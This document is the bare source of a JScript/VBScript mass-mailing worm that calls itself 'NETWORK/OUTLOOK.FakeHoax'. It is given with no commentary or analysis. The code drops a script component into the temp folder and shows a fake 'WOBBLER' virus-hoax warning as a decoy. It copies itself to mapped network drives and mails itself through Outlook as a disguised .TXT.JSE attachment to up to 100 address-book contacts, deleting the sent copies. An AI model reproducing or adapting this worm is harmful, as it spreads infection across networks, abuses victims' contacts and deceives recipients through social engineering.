G=new ActiveXObject("Scripting.FileSystemObject");
A=G.GetTempName().concat(".WSC");
S=G.CreateTextFile(G.BuildPath(G.GetSpecialFolder(2),A),true);
S.Write("<?XML version=\"1.0\"?>\r\n<component>\r\n  <comment>\r\n    NETWORK/OUTLOOK.FakeHoax\r\n  </comment>\r\n  <public>\r\n    <property name=\"AttachmentFile\"/>\r\n    <property name=\"TextFile\"/>\r\n    <property name=\"WormFile\"/>\r\n    <method name=\"DelTempFiles\"/>\r\n    <method name=\"NetworkSpreading\">\r\n      <parameter name=\"FileName\"/>\r\n    </method>\r\n    <method name=\"OutlookSpreading\">\r\n      <parameter name=\"Body\"/>\r\n      <parameter name=\"MaxAmount\"/>\r\n      <parameter name=\"Subject\"/>\r\n    </method>\r\n    <method name=\"ShowText\">\r\n      <parameter name=\"Content\"/>\r\n    </method>\r\n  </public>\r\n  <script language=\"VBScript\">\r\n    <![CDATA[\r\n    Sub DelTempFiles\r\n      On Error Resume Next\r\n      Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n      If FSO.FileExists(AttachmentFile) Then FSO.DeleteFile AttachmentFile, True\r\n      If FSO.FileExists(TextFile) Then FSO.DeleteFile TextFile, True\r\n      Set FSO = Nothing\r\n    End Sub\r\n    Sub NetworkSpreading(FileName)\r\n      On Error Resume Next\r\n      Set Network = CreateObject(\"WScript.Network\")\r\n      Set Shares = Network.EnumNetworkDrives\r\n      If Shares.Count > 0 Then\r\n        Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n        For Counter1 = 0 To Shares.Count - 1\r\n          If Shares.Item(Counter1) <> \"\" Then FSO.CopyFile WormFile, FSO.BuildPath(Shares.Item(Counter1), FileName)\r\n        Next\r\n        Set FSO = Nothing\r\n      End If\r\n      Set Shares = Nothing\r\n      Set Network = Nothing\r\n    End Sub\r\n    Sub OutlookSpreading(MaxAmount, Subject, Body)\r\n      On Error Resume Next\r\n      Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n      FSO.CopyFile WormFile, AttachmentFile\r\n      Set FSO = Nothing\r\n      Outlook = \"\"\r\n      Set Outlook = CreateObject(\"Outlook.Application\")\r\n      If Outlook <> \"\" Then\r\n        Set MAPI = Outlook.GetNameSpace(\"MAPI\")\r\n        For Each List In MAPI.AddressLists\r\n          If List.AddressEntries.Count > 0 Then\r\n            Set Email1 = Outlook.CreateItem(0)\r\n            If List.AddressEntries.Count > MaxAmount Then\r\n              Dim Address()\r\n              ReDim Address(MaxAmount - 1)\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                Address(Counter1) = Int(List.AddressEntries.Count * Rnd)\r\n              Next\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                For Counter2 = Counter1 + 1 To MaxAmount - 1\r\n                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1\r\n                Next\r\n              Next\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                If Address(Counter1) = -1 Then Address(Counter1) = Int(List.AddressEntries.Count * Rnd)\r\n              Next\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                For Counter2 = Counter1 + 1 To MaxAmount - 1\r\n                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1\r\n                Next\r\n              Next\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                If Address(Counter1) <> -1 Then\r\n                  Set Entry = List.AddressEntries(Address(Counter1))\r\n                  If Counter1 = 0 Then Addresses = Entry.Address Else Addresses = Addresses & \"; \" & Entry.Address\r\n                  Set Entry = Nothing\r\n                End If\r\n              Next\r\n            Else\r\n              For Counter1 = 1 To List.AddressEntries.Count\r\n                Set Entry = List.AddressEntries(Counter1)\r\n                If Counter1 = 1 Then Addresses = Entry.Address Else Addresses = Addresses & \"; \" & Entry.Address\r\n                Set Entry = Nothing\r\n              Next\r\n            End If\r\n            Email1.BCC = Addresses\r\n            Email1.Subject = Subject\r\n            Email1.Body = Body\r\n            Email1.Attachments.Add AttachmentFile\r\n            Email1.DeleteAfterSubmit = True\r\n            Email1.Send\r\n            Set Email1 = Nothing\r\n            Randomize\r\n            If Int(5 * Rnd) = 0 Then\r\n              Set Email2 = Outlook.CreateItem(0)\r\n              Email2.BCC = Addresses\r\n              Email2.Subject = \"Alma\"\r\n              Email2.Body = \"No alucines que te amo,\" & Chr(13) & Chr(10) & \"cuando en realidad es solo\" & Chr(13) & Chr(10) & \"mi coraz\" & Chr(243) & \"n qui\" & Chr(233) & \"n lo hace.\" & Chr(13) & Chr(10) & \"Porque como ya sabr\" & Chr(225) & \"s,\" & Chr(13) & Chr(10) & \"mi coraz\" & Chr(243) & \"n no manda en mi vida,\" & Chr(13) & Chr(10) & \"si as\" & Chr(237) & \" lo hiciera,\" & Chr(13) & Chr(10) & \"mi alma estar\" & Chr(237) & \"a perdida.\"\r\n              Email2.DeleteAfterSubmit = True\r\n              Email2.Send\r\n              Set Email2 = Nothing\r\n            End If\r\n          End If\r\n        Next\r\n        Set MAPI = Nothing\r\n        Set Outlook = Nothing\r\n      End If\r\n    End Sub\r\n    Sub ShowText(Content)\r\n      On Error Resume Next\r\n      Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n      Set File = FSO.CreateTextFile(TextFile, True)\r\n      File.Write(Content)\r\n      File.Close\r\n      Set File = Nothing\r\n      Set FSO = Nothing\r\n      Set WSHShell = CreateObject(\"WScript.Shell\")\r\n      WSHShell.Run(TextFile)\r\n      Set WSHShell = Nothing\r\n    End Sub\r\n    ]]>\r\n  </script>\r\n</component>\r\n")
S.Close();
F=GetObject("script:".concat(G.BuildPath(G.GetSpecialFolder(2),A)));
F.AttachmentFile=G.BuildPath(G.GetSpecialFolder(2),"WOBBLER.TXT.JSE");
F.TextFile=G.BuildPath(G.GetSpecialFolder(2),"WOBBLER.TXT");
F.WormFile=WScript.ScriptFullName;
F.ShowText("Thought you might be interested in this message. If you receive an\r\nemail with a file called \"California\" do not open the file. The file\r\ncontains the \"WOBBLER\" virus.\r\n\r\nThis information was announced yesterday morning by IBM. The statement\r\nsays that ... \"This is a very dangerous virus, much worse than\r\n'Melissa' and there is NO remedy for it at this time. Some very sick\r\nindividual has succeeded in using the reformat function from Norton\r\nUtilities causing it to completely erase all documents on the hard\r\ndrive. It has been designed to work with Netscape Navigator and\r\nMicrosoft Internet Explorer. It destroys Macintosh and IBM compatible\r\ncomputers. This is a new, very malicious virus and not many people\r\nknow about it at this time.\"\r\n\"Please pass this warning file to everyone in your address book and\r\nshare it with all your online friends ASAP so that the destruction it\r\ncan cause may be minimized.\"\r\n");
F.OutlookSpreading(100,"Fw: important","> Thought you might be interested in this message, read the attachment for more information.");
F.NetworkSpreading("WOBBLER.TXT.JSE");
F.DelTempFiles();
G.DeleteFile(G.BuildPath(G.GetSpecialFolder(2),A),true);
